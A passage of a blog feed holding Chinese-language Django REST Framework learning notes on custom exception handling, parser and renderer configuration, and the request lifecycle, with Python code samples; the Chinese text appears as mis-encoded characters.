Response</span><br><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> status</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exception_handler</span><span class="params">(exc, context)</span>:</span>  <span class="comment">#è‡ªå®šä¹‰å¤„ç†å¼‚å¸¸å‡½æ•°</span></span><br><span class="line">    <span class="comment"># drfçš„exception_handleråšåŸºç¡€å¤„ç†</span></span><br><span class="line">    response = drf_exception_handler(exc, context)</span><br><span class="line">    <span class="comment"># ä¸ºç©ºï¼Œå°±æ˜¯drfæ¡†æ¶å¤„ç†ä¸äº†çš„å¼‚å¸¸</span></span><br><span class="line">    <span class="keyword">if</span> response <span class="keyword">is</span> <span class="literal">None</span>: <span class="comment">#å¤„ç†ä¹‹åä¸ºç©ºï¼Œå†è¿›è¡Œè‡ªå®šä¹‰çš„äºŒæ¬¡å¤„ç†</span></span><br><span class="line">        <span class="comment"># print(exc)    #é”™è¯¯åŸå›    è¿˜å¯ä»¥åšæ›´è¯¦ç»†çš„åŸå› ï¼Œé€šè¿‡åˆ¤æ–­excä¿¡æ¯ç±»å‹</span></span><br><span class="line">        <span class="comment"># print(context)  #é”™è¯¯ä¿¡æ¯</span></span><br><span class="line">        print(<span class="string">'%s - %s - %s'</span> % (context[<span class="string">'view'</span>], context[<span class="string">'request'</span>].method, exc))</span><br><span class="line">        <span class="keyword">return</span> Response(&#123;</span><br><span class="line">            <span class="string">'detail'</span>: <span class="string">'global customized exception: internal server error'</span> <span class="comment"># å…¨å±€å®šåˆ¶å¼‚å¸¸ï¼šæœåŠ¡å™¨é”™è¯¯</span></span><br><span class="line">        &#125;, status=status.HTTP_500_INTERNAL_SERVER_ERROR, exception=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> response     <span class="comment">#å¤„ç†ä¹‹åæœ‰å€¼ï¼Œå°±ç›´æ¥è¿”å›ç»“æœ</span></span><br></pre></td></tr></table></figure><h2 id="è‡ªå®šä¹‰å±€éƒ¨é…ç½®"><a href="#è‡ªå®šä¹‰å±€éƒ¨é…ç½®" class="headerlink" title="è‡ªå®šä¹‰å±€éƒ¨é…ç½®"></a>è‡ªå®šä¹‰å±€éƒ¨é…ç½®</h2><p>è¿™æ˜¯æˆ‘æ‹“å±•çš„æ–¹æ³•ï¼Œå®ƒå¯ä»¥é’ˆå¯¹æŸä¸ªç‰¹å®šçš„è§†å›¾ç±»ï¼Œå®šåˆ¶ä¸åŒäºå…¨å±€å®šåˆ¶å¼‚å¸¸çš„ç‰¹æœ‰å¤„ç†æ–¹å¼ã€‚</p><p>æ ¹æ®å‰é¢çš„æºç åˆ†æä¸­å¯ä»¥çŸ¥é“ï¼Œè¦ä¸ºè§†å›¾ç±»å•ç‹¬å®šåˆ¶å¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œå¯ä»¥è¿™æ ·åšï¼š</p><ol><li>åœ¨ç»§æ‰¿<code>APIView</code>ç¼–å†™è§†å›¾ç±»æ—¶ï¼Œé‡å†™çˆ¶ç±»çš„<code>get_exception_handler</code>å‡½æ•°ï¼Œè®©å¼‚å¸¸å¤„ç†å‡½æ•°æŒ‡å‘è‡ªå®šä¹‰çš„å¼‚å¸¸å¤„ç†å‡½æ•°ã€‚</li><li>åœ¨è§†å›¾ç±»ä¸­åŠ å…¥å®šåˆ¶çš„å¼‚å¸¸å¤„ç†å‡½æ•°ã€‚</li></ol><p>ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.views.decorators.csrf <span class="keyword">import</span> csrf_exempt</span><br><span class="line"><span class="keyword">from</span> django.utils.decorators <span class="keyword">import</span> method_decorator</span><br><span class="line"><span class="comment"># drfåŸç”Ÿå¤„ç†å¼‚å¸¸å‡½æ•°å–åˆ«å drf_exception_handler</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> exception_handler <span class="keyword">as</span> drf_exception_handler</span><br><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> Response</span><br><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> status</span><br><span class="line"></span><br><span class="line"><span class="meta">@method_decorator(csrf_exempt, name='dispatch')</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LocalExceptionView</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        print(request.query_params)</span><br><span class="line">        print(request.data)</span><br><span class="line">        print(request.not_exists) <span class="comment"># error code</span></span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">'post ok'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_exception_handler</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.exception_handler</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exception_handler</span><span class="params">(self, exc, context)</span>:</span></span><br><span class="line">        <span class="comment"># drfçš„exception_handleråšåŸºç¡€å¤„ç†</span></span><br><span class="line">        response = drf_exception_handler(exc, context)</span><br><span class="line">        <span class="comment"># ä¸ºç©ºï¼Œå°±æ˜¯drfæ¡†æ¶å¤„ç†ä¸äº†çš„å¼‚å¸¸</span></span><br><span class="line">        <span class="keyword">if</span> response <span class="keyword">is</span> <span class="literal">None</span>: <span class="comment">#å¤„ç†ä¹‹åä¸ºç©ºï¼Œå†è¿›è¡Œè‡ªå®šä¹‰çš„äºŒæ¬¡å¤„ç†</span></span><br><span class="line">            <span class="comment"># print(exc)    #é”™è¯¯åŸå›    è¿˜å¯ä»¥åšæ›´è¯¦ç»†çš„åŸå› ï¼Œé€šè¿‡åˆ¤æ–­excä¿¡æ¯ç±»å‹</span></span><br><span class="line">            <span class="comment"># print(context)  #é”™è¯¯ä¿¡æ¯</span></span><br><span class="line">            print(<span class="string">'%s - %s - %s'</span> % (context[<span class="string">'view'</span>], context[<span class="string">'request'</span>].method, exc))</span><br><span class="line">            <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                <span class="string">'detail'</span>: <span class="string">'local customized exception: internal server error'</span> <span class="comment"># å±€éƒ¨å®šåˆ¶å¼‚å¸¸ï¼šæœåŠ¡å™¨é”™è¯¯</span></span><br><span class="line">            &#125;, status=status.HTTP_500_INTERNAL_SERVER_ERROR, exception=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">return</span> response     <span class="comment">#å¤„ç†ä¹‹åæœ‰å€¼ï¼Œå°±ç›´æ¥è¿”å›ç»“æœ</span></span><br></pre></td></tr></table></figure><h2 id="æµ‹è¯•demo"><a href="#æµ‹è¯•demo" class="headerlink" title="æµ‹è¯•demo"></a>æµ‹è¯•demo</h2><p>æµ‹è¯•ä»£ç åœ¨è¿™é‡Œï¼š<a href="">no5_drf_exception</a></p><p>å…¶ä¸­åŒ…å«ï¼š</p><ul><li>djangoé¡¹ç›®<ul><li>å…¨å±€å®šåˆ¶å¼‚å¸¸</li><li>å±€éƒ¨å®šåˆ¶å¼‚å¸¸</li></ul></li><li>postmanæµ‹è¯•æ•°æ®åŒ…<ul><li>å…¨å±€å®šåˆ¶å¼‚å¸¸æµ‹è¯•</li><li>å±€éƒ¨å®šåˆ¶å¼‚å¸¸æµ‹è¯•</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Backend </tag>
            
            <tag> Django </tag>
            
            <tag> Django REST Framework </tag>
            
            <tag> DRF </tag>
            
            <tag> Learning Notes </tag>
            
            <tag> Tech </tag>
            
            <tag> Dev </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django REST Framework å­¦ä¹ ç¬”è®°ï¼ˆå››ï¼‰ï¼šè§£ææ¨¡å— parsers</title>
      <link href="/tech/drf-learning-notes-4-the-parsers-module/"/>
      <url>/tech/drf-learning-notes-4-the-parsers-module/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Django REST Framework Learning Notes (4): the parsers module</strong></em></li><li>Author: dog2</li></ul><hr><h1 id="åŸºæœ¬ä¿¡æ¯"><a href="#åŸºæœ¬ä¿¡æ¯" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h1><ul><li>æºç ï¼š<a href="https://github.com/encode/django-rest-framework/blob/master/rest_framework/parsers.py" target="_blank" rel="noopener"><code>rest_framework.parsers</code></a></li><li>å®˜æ–¹æ–‡æ¡£ï¼š<span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcGFyc2Vycy8=">API Guild - Parsers<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzRfZHJmX3BhcnNlcg==">æœ¬æ–‡demoä»£ç Github<i class="fa fa-external-link-alt"></i></span></li></ul><a id="more"></a><h1 id="åŠŸèƒ½"><a href="#åŠŸèƒ½" class="headerlink" title="åŠŸèƒ½"></a>åŠŸèƒ½</h1><ol><li>drfç»™æˆ‘ä»¬æä¾›äº†å¤šç§è§£ææ•°æ®åŒ…æ–¹å¼çš„è§£æç±»<ul><li>form-data</li><li>x-www-form-urlencoded</li><li>json</li></ul></li><li>æˆ‘ä»¬å¯ä»¥é€šè¿‡é…ç½®æ¥æ§åˆ¶å‰å°æäº¤çš„å“ªäº›æ ¼å¼çš„æ•°æ®åå°åœ¨è§£æï¼Œå“ªäº›æ•°æ®ä¸è§£æ</li><li>å…¨å±€é…ç½®å°±æ˜¯é’ˆå¯¹æ¯ä¸€ä¸ªè§†å›¾ç±»ï¼Œå±€éƒ¨é…ç½®å°±æ˜¯é’ˆå¯¹æŒ‡å®šçš„è§†å›¾æ¥ï¼Œè®©å®ƒä»¬å¯ä»¥æŒ‰ç…§é…ç½®è§„åˆ™é€‰æ‹©æ€§è§£ææ•°æ®</li></ol><h1 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># APIViewç±»çš„dispatchæ–¹æ³•ä¸­</span></span><br><span class="line">request = self.initialize_request(request, *args, **kwargs)  <span class="comment"># ç‚¹è¿›å»</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#å‡†å¤‡è¦è§£æçš„æ•°æ®</span></span><br><span class="line">parser_context=self.get_parser_context(request)   <span class="comment"># ä¸æ˜¯é‡ç‚¹</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è§£ææ¨¡å—ï¼Œè·å–è§£æç±»</span></span><br><span class="line">parsers=self.get_parsers()  <span class="comment"># ç‚¹è¿›å»</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å»ç±»å±æ€§(å±€éƒ¨é…ç½®) æˆ– é…ç½®æ–‡ä»¶(å…¨å±€é…ç½®) æ‹¿ parser_classes</span></span><br><span class="line"><span class="keyword">return</span> [parser() <span class="keyword">for</span> parser <span class="keyword">in</span> self.parser_classes]</span><br><span class="line"></span><br><span class="line"><span class="comment"># self.parser_classesä¸ºAPIViewç±»å±æ€§</span></span><br><span class="line">parser_classes = api_settings.DEFAULT_PARSER_CLASSES</span><br><span class="line"></span><br><span class="line"><span class="comment"># api_settingsä¸­çš„è§£æç±»</span></span><br><span class="line"><span class="string">'DEFAULT_PARSER_CLASSES'</span>: [</span><br><span class="line">        <span class="string">'rest_framework.parsers.JSONParser'</span>,       <span class="comment"># jsonæ•°æ®åŒ…</span></span><br><span class="line">        <span class="string">'rest_framework.parsers.FormParser'</span>,       <span class="comment"># x-www-form-urlencodedæ•°æ®åŒ…  </span></span><br><span class="line">        <span class="string">'rest_framework.parsers.MultiPartParser'</span>,  <span class="comment"># form-dataæ•°æ®åŒ…</span></span><br><span class="line">],</span><br></pre></td></tr></table></figure><h1 id="ç”¨æ³•ç¤ºä¾‹"><a href="#ç”¨æ³•ç¤ºä¾‹" class="headerlink" title="ç”¨æ³•ç¤ºä¾‹"></a>ç”¨æ³•ç¤ºä¾‹</h1><h2 id="è‡ªå®šä¹‰å…¨å±€é…ç½®"><a href="#è‡ªå®šä¹‰å…¨å±€é…ç½®" class="headerlink" title="è‡ªå®šä¹‰å…¨å±€é…ç½®"></a>è‡ªå®šä¹‰å…¨å±€é…ç½®</h2><p>æ‰€æœ‰è§†å›¾ç±»ç»Ÿä¸€å¤„ç†ï¼Œåœ¨é¡¹ç›®çš„<code>settings.py</code>ä¸­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">REST_FRAMEWORK = &#123;</span><br><span class="line">    <span class="comment"># å…¨å±€è§£æç±»é…ç½®</span></span><br><span class="line">    <span class="string">'DEFAULT_PARSER_CLASSES'</span>: [</span><br><span class="line">        <span class="string">'rest_framework.parsers.JSONParser'</span>,       <span class="comment"># jsonæ•°æ®åŒ…</span></span><br><span class="line">        <span class="string">'rest_framework.parsers.FormParser'</span>,       <span class="comment"># x-www-form-urlencodedæ•°æ®åŒ…</span></span><br><span class="line">        <span class="string">'rest_framework.parsers.MultiPartParser'</span>,  <span class="comment"># form-dataæ•°æ®åŒ…</span></span><br><span class="line">    ],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="è‡ªå®šä¹‰å±€éƒ¨é…ç½®"><a href="#è‡ªå®šä¹‰å±€éƒ¨é…ç½®" class="headerlink" title="è‡ªå®šä¹‰å±€éƒ¨é…ç½®"></a>è‡ªå®šä¹‰å±€éƒ¨é…ç½®</h2><p>æŸä¸€ä¸ªæˆ–ä¸€äº›è§†å›¾ç±»å•ç‹¬å¤„ç†ï¼Œåœ¨<code>views.py</code>è§†å›¾ç±»ä¸­æä¾›å¯¹åº”çš„ç±»å±æ€§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.parsers <span class="keyword">import</span> JSONParser</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Book</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="comment"># å±€éƒ¨è§£æç±»é…ç½®ï¼Œåªè¦jsonç±»å‹çš„æ•°æ®åŒ…æ‰èƒ½è¢«è§£æ</span></span><br><span class="line">    parser_classes = [JSONParser]</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="æµ‹è¯•demo"><a href="#æµ‹è¯•demo" class="headerlink" title="æµ‹è¯•demo"></a>æµ‹è¯•demo</h2><p>æµ‹è¯•ä»£ç åœ¨è¿™é‡Œï¼š<a href="">no4_drf_parser</a></p><p>å…¶ä¸­åŒ…å«ï¼š</p><ul><li>djangoé¡¹ç›®</li><li>postmanæµ‹è¯•æ•°æ®åŒ…ï¼šBodyæ ‡ç­¾é¡µå®šä¹‰äº†3ç§æ ¼å¼çš„æ•°æ®ã€‚åœ¨å±€éƒ¨è®¾ç½®åªèƒ½æŸä¸€ç§æˆ–ä¸¤ç§ï¼Œåˆ™åœ¨postmanå…¶ä»–æ ¼å¼ä¼ é€’çš„æ•°æ®éƒ½ä¸æ˜¾ç¤ºã€‚<ul><li>json</li><li>x-www-form-urlencoded</li><li>form-data</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Backend </tag>
            
            <tag> Django </tag>
            
            <tag> Django REST Framework </tag>
            
            <tag> DRF </tag>
            
            <tag> Learning Notes </tag>
            
            <tag> Tech </tag>
            
            <tag> Dev </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django REST Framework å­¦ä¹ ç¬”è®°ï¼ˆä¸‰ï¼‰ï¼šæ¸²æŸ“æ¨¡å— renders</title>
      <link href="/tech/drf-learning-notes-3-the-renders-module/"/>
      <url>/tech/drf-learning-notes-3-the-renders-module/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Django REST Framework Learning Notes (3): the renders module</strong></em></li><li>Author: dog2</li></ul><hr><p>ç”¨DRFåšæµ‹è¯•ä¼šå‘ç°ï¼Œç”¨æµè§ˆå™¨è¯·æ±‚APIè¿”å›DRFå®šåˆ¶çš„é¡µé¢ï¼Œå¯¹å¼€å‘è€…ç›¸å½“å‹å¥½ï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img data-src="https://www.django-rest-framework.org/img/quickstart.png" alt=""></p><p>è€Œè‹¥ä½¿ç”¨pythonç¬¬ä¸‰æ–¹æ¨¡å—requestsæˆ–è€…postmanç­‰å·¥å…·ï¼Œè¿™åˆ™è¿”å›çš„æ˜¯åŸç”Ÿçš„jsonæ•°æ®ã€‚</p><p>å®ç°è¿™ç§å·®åˆ«å“åº”çš„ï¼Œæ­£æ˜¯æœ¬èŠ‚çš„ä¸»è§’â€”â€”(å“åº”)æ¸²æŸ“æ¨¡å—ã€‚</p><h1 id="åŸºæœ¬ä¿¡æ¯"><a href="#åŸºæœ¬ä¿¡æ¯" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h1><ul><li>æºç ï¼š<a href="https://github.com/encode/django-rest-framework/blob/master/rest_framework/renders.py" target="_blank" rel="noopener"><code>rest_framework.renders</code></a><ul><li><code>rest_framework.request.Request</code>ï¼šä¸»è¦ç±»</li></ul></li><li>å®˜æ–¹æ–‡æ¡£ï¼š<span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcmVuZGVyZXJzLw==">API Guild - Renderers<i class="fa fa-external-link-alt"></i></span></li></ul><a id="more"></a><h1 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åœ¨`APIView`ç±»çš„`dispatch`æ–¹æ³•ä¸­ï¼Œæœ€åè§£æreponseå¯¹è±¡æ•°æ®</span></span><br><span class="line">self.response = self.finalize_response(request, response, *args, **kwargs) <span class="comment">#ç‚¹è¿›å»</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‹¿åˆ°è¿è¡Œçš„è§£æç±»çš„å¯¹è±¡ä»¬</span></span><br><span class="line">neg = self.perform_content_negotiation(request, force=<span class="literal">True</span>)   <span class="comment">#ç‚¹è¿›å»</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å¾—è§£æç±»å¯¹è±¡</span></span><br><span class="line">renderers = self.get_renderers()   <span class="comment">#ç‚¹è¿›å»</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»è§†å›¾ç±»ä¸­å¾—åˆ°renderer_classesè¯·æ±‚ç±»ï¼Œå¦‚ä½•å®ä¾‹åŒ–ä¸€ä¸ªä¸ªå¯¹è±¡å½¢å‚è§£æç±»å¯¹è±¡åˆ—è¡¨</span></span><br><span class="line"><span class="keyword">return</span> [renderer() <span class="keyword">for</span> renderer <span class="keyword">in</span> self.renderer_classes]  <span class="comment">#é…ç½®æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># self.renderer_classesä¸ºAPIViewç±»å±æ€§</span></span><br><span class="line">renderer_classes = api_settings.DEFAULT_RENDERER_CLASSES</span><br><span class="line"></span><br><span class="line"><span class="comment"># api_settingsä¸­çš„é»˜è®¤æ¸²æŸ“ç±»</span></span><br><span class="line"><span class="string">'DEFAULT_RENDERER_CLASSES'</span>: [</span><br><span class="line">        <span class="string">'rest_framework.renderers.JSONRenderer'</span>,</span><br><span class="line">        <span class="string">'rest_framework.renderers.BrowsableAPIRenderer'</span>,</span><br><span class="line">],</span><br></pre></td></tr></table></figure><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>è°ƒç”¨é“¾å¦‚ä¸‹ï¼š</p><ol><li>è‡ªå·±è§†å›¾ç±»çš„ç±»å±æ€§(å±€éƒ¨é…ç½®)</li><li><code>APIView</code>ç±»çš„ç±»å±æ€§è®¾ç½®</li><li>è‡ªå·±é…ç½®æ–‡ä»¶çš„<code>DEFAULT_RENDERER_CLASSES</code>(å…¨å±€é…ç½®)</li><li>drfé…ç½®æ–‡ä»¶çš„<code>DEFAULT_RENDERER_CLASSES</code></li></ol><h1 id="ç”¨æ³•ç¤ºä¾‹"><a href="#ç”¨æ³•ç¤ºä¾‹" class="headerlink" title="ç”¨æ³•ç¤ºä¾‹"></a>ç”¨æ³•ç¤ºä¾‹</h1><h2 id="è‡ªå®šä¹‰å…¨å±€é…ç½®"><a href="#è‡ªå®šä¹‰å…¨å±€é…ç½®" class="headerlink" title="è‡ªå®šä¹‰å…¨å±€é…ç½®"></a>è‡ªå®šä¹‰å…¨å±€é…ç½®</h2><p>æ‰€æœ‰è§†å›¾ç±»ç»Ÿä¸€å¤„ç†ï¼Œåœ¨é¡¹ç›®çš„<code>settings.py</code>ä¸­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">REST_FRAMEWORK = &#123;</span><br><span class="line">    <span class="comment"># drfæä¾›çš„æ¸²æŸ“ç±»</span></span><br><span class="line">    <span class="string">'DEFAULT_RENDERER_CLASSES'</span>: [</span><br><span class="line">        <span class="string">'rest_framework.renderers.JSONRenderer'</span>,       <span class="comment">#åªæ˜¾ç¤ºå‡ºjsonæ•°æ®</span></span><br><span class="line">      <span class="string">'rest_framework.renderers.BrowsableAPIRenderer'</span>,    <span class="comment">#æ¸²æŸ“å‡ºé¡µé¢ï¼Œæ³¨æ„æ˜¯BrowsableAPIRenderer</span></span><br><span class="line">    ],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="è‡ªå®šä¹‰å±€éƒ¨é…ç½®"><a href="#è‡ªå®šä¹‰å±€éƒ¨é…ç½®" class="headerlink" title="è‡ªå®šä¹‰å±€éƒ¨é…ç½®"></a>è‡ªå®šä¹‰å±€éƒ¨é…ç½®</h2><p>æŸä¸€ä¸ªæˆ–ä¸€äº›å®ä½“ç±»å•ç‹¬å¤„ç†ï¼Œåœ¨<code>views.py</code>è§†å›¾ç±»ä¸­æä¾›å¯¹åº”çš„ç±»å±æ€§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åœ¨setting.pyä¸­é…ç½®REST_FRAMEWORKï¼Œå®Œæˆçš„æ˜¯å…¨å±€é…ç½®ï¼Œæ‰€æœ‰æ¥å£ç»Ÿä¸€å¤„ç†</span></span><br><span class="line"><span class="comment"># å¦‚æœåªæœ‰éƒ¨åˆ†æ¥å£ç‰¹æ®ŠåŒ–ï¼Œå¯ä»¥å®Œæˆ - å±€éƒ¨é…ç½®</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.renderers <span class="keyword">import</span> JSONRenderer</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="comment"># å±€éƒ¨é…ç½®</span></span><br><span class="line">    renderer_classes = [JSONRenderer]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">'drf get ok 2'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">'drf post ok 2'</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Backend </tag>
            
            <tag> Django </tag>
            
            <tag> Django REST Framework </tag>
            
            <tag> DRF </tag>
            
            <tag> Learning Notes </tag>
            
            <tag> Tech </tag>
            
            <tag> Dev </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django REST Framework å­¦ä¹ ç¬”è®°ï¼ˆäºŒï¼‰ï¼šè¯·æ±‚æ¨¡å— request</title>
      <link href="/tech/drf-learning-notes-2-the-request-module/"/>
      <url>/tech/drf-learning-notes-2-the-request-module/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Django REST Framework Learning Notes (2): the request module</strong></em></li><li>Author: dog2</li></ul><hr><h1 id="DRFè¯·æ±‚ç”Ÿå‘½å‘¨æœŸæµç¨‹"><a href="#DRFè¯·æ±‚ç”Ÿå‘½å‘¨æœŸæµç¨‹" class="headerlink" title="DRFè¯·æ±‚ç”Ÿå‘½å‘¨æœŸæµç¨‹"></a>DRFè¯·æ±‚ç”Ÿå‘½å‘¨æœŸæµç¨‹</h1><ol><li>æ ¹æ®åº”ç”¨ä¸­<code>urls.py</code>ï¼Œèµ°<code>as_view</code>æ–¹æ³•ï¼Œä½†æ˜¯è§†å›¾ç±»æ²¡æœ‰è¯¥æ–¹æ³•ï¼Œæ‰€ä»¥è¯·æ±‚èµ°çš„æ˜¯<code>APIView</code>çš„<code>as_view</code>æ–¹æ³•</li><li>åœ¨<code>APIView</code>çš„<code>as_view</code>è°ƒç”¨çˆ¶ç±»(djangoåŸç”ŸView)çš„<code>as_view</code>ï¼ŒåŒæ—¶è¿˜ç¦ç”¨äº† csrf è®¤è¯</li><li>åœ¨çˆ¶ç±»ï¼ˆdjangoåŸç”ŸViewï¼‰çš„<code>as_view</code>ä¸­<code>dispatch</code>æ–¹æ³•è¯·æ±‚èµ°çš„åˆæ˜¯<code>APIView</code>çš„<code>dispatch</code><ul><li>å› ä¸º<code>APIView</code>ä¹Ÿå¯ä»¥èµ°<code>dispatch</code>ï¼Œè§†å›¾ç±»æ˜¯å…ˆç»§æ‰¿<code>APIView</code>ï¼Œ<code>APIView</code>ä¸­æ²¡æœ‰å†å»åŸç”Ÿ<code>View</code>ä¸­</li></ul></li><li>å®Œæˆä»»åŠ¡æ–¹æ³•äº¤ç»™è§†å›¾ç±»çš„è¯·æ±‚å‡½æ•°å¤„ç†ï¼Œå¾—åˆ°è¯·æ±‚çš„å“åº”ç»“æœï¼Œè¿”å›ç»™å‰å°</li></ol><p>å› æ­¤ç›´æ¥ä»APIViewçš„dispatchå…¥å£çœ‹æºç ã€‚</p><h1 id="è¯·æ±‚æ¨¡å—"><a href="#è¯·æ±‚æ¨¡å—" class="headerlink" title="è¯·æ±‚æ¨¡å—"></a>è¯·æ±‚æ¨¡å—</h1><h2 id="åŸºæœ¬ä¿¡æ¯"><a href="#åŸºæœ¬ä¿¡æ¯" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h2><ul><li>æºç ï¼š<a href="https://github.com/encode/django-rest-framework/blob/master/rest_framework/request.py" target="_blank" rel="noopener"><code>rest_framework.request</code></a><ul><li><code>rest_framework.request.Request</code>ï¼šä¸»è¦ç±»</li></ul></li><li>å®˜æ–¹æ–‡æ¡£ï¼š<span class="exturl" 